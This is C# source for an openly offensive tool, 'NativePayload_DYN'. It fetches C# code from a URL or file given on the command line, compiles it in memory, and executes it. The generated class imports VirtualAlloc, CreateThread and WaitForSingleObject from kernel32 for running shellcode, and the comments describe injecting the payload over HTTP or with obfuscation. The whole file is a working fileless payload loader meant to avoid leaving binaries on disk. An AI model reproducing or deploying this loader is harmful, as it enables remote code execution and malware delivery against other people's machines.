using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

namespace NativePayload_DYN
{
    class Program
    {
        private static string[] Loading_Dlls;
        private static string[] Loading_Namespaces;

        private static List<string> ReferencedAssemblies { get; set; }
        private static List<string> UsingNamespaces { get; set; }

        private static string DynamicCode;

        static void Main(string[] args)
        {
            Loading_Dlls = new string[] { "System.dll", "System.Core.dll", "System.Data.dll", "System.Xml.dll", "System.Xml.Linq.dll" , "System.Runtime.InteropServices.dll", "mscorlib.dll" };
            Loading_Namespaces = new string[] { "System", "System.Collections.Generic", "System.Linq", "System.Text" , "System.Runtime.InteropServices" };

            ReferencedAssemblies = new List<string>();
            UsingNamespaces = new List<string>();

           
            //sourceCode = System.IO.File.ReadAllText("class1.cs");
            if (args[0].ToUpper() == "-F")
            {
                DynamicCode = System.IO.File.ReadAllText(args[1]);
            }

            if (args[0].ToUpper() == "-W")
            {
                System.Net.WebClient web = new System.Net.WebClient();
                string xCxSharp_Payload = web.DownloadString(args[1]);
                DynamicCode = xCxSharp_Payload;
            }
            

            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine();
            Console.WriteLine("NativePayload_DYN tool , Runtime/Compiler Dynamic Managed Code ");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Published by Damon Mohammadbagher Jun 2017");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("[!] Downloading .NET Source Code File by File/Url {0}", args[1]);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[>] Runtime Compiling .NET Source Code File and Generate/Execute In Memory");

            Console.ForegroundColor = ConsoleColor.Gray;

            CompilerErrorCollection compilationErrors = new CompilerErrorCollection();

            bool compilationSucceeded = true;
            
            CSharpCodeProvider provider = new CSharpCodeProvider();

            /// Build the parameters
            CompilerParameters Code_Params = new CompilerParameters();

            Code_Params.TreatWarningsAsErrors = false;

            /// Add references.
            Code_Params.ReferencedAssemblies.AddRange(Loading_Dlls);
            Code_Params.ReferencedAssemblies.AddRange(ReferencedAssemblies.ToArray());
            
            /// Generating output in Memory , oh yeah ;) Important point.
            Code_Params.GenerateInMemory = true;

            /// Add using statements.
            StringBuilder script = new StringBuilder();
            foreach (var usingNamespace in Loading_Namespaces)
                script.AppendFormat("using {0};\n", usingNamespace);

            foreach (var additionalUsingNamespace in UsingNamespaces)
                script.AppendFormat("using {0};\n", additionalUsingNamespace);

            /// Generating Dynamic Code by StringBuilder , 
            /// "DynamicCode" Variable is your Dynamic Code and this RAW C#.NET Code injected by HTTP Traffic in this case.
            /// you can Download or Inject this RAW C# Code by other Protocols or with Obfuscation method etc.
            script.AppendLine();
            script.AppendLine("namespace Execute_Me_in_Memory");
            script.AppendLine("{");
            script.AppendLine("    public class Program");
            script.AppendLine("    {");
            script.AppendLine("        public void main(string your_input_args)");
            script.AppendLine("        {");
            script.AppendLine("            ");
            script.AppendLine("            ");
            script.AppendFormat("              {0}\n", DynamicCode);
            script.AppendLine("            ");
            script.AppendLine("            ");
            script.AppendLine("        }");
            script.AppendLine("   [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);     ");
            script.AppendLine("   [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);     ");
            script.AppendLine("   [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);     ");
            script.AppendLine("    }");
            script.AppendLine("}");

            /// Compiling / Executing this C#.NET Code in Memory 
            /// Begin
            
            CompilerResults Compiler_Results = provider.CompileAssemblyFromSource(Code_Params, script.ToString());

            if (Compiler_Results.Errors.Count > 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[Compile error]");

                foreach (CompilerError Compiler_Error in Compiler_Results.Errors)
                {                  
                    compilationErrors.Add(Compiler_Error);

                    Console.WriteLine("[error] : {0}",Compiler_Error.ErrorText);

                    if (!Compiler_Error.IsWarning)
                    {
                        compilationSucceeded = false;
                    }
                }

                Console.ForegroundColor = ConsoleColor.Gray;
            }

            if (compilationSucceeded)
            {
                var Compiled_Assembly = Compiler_Results.CompiledAssembly;
                var Exe = Compiled_Assembly.CreateInstance("Execute_Me_in_Memory.Program");

                var type = Exe.GetType();
                var methodInfo = type.GetMethod("main");

                /// Execute in memory.
                /// "your input" is important thing , you can modify your code by this variable too
                methodInfo.Invoke(Exe, new object[] { "your input" });
            }

            /// Compiling / Executing this C#.NET Code in Memory 
            /// End

          

        }
    }
}
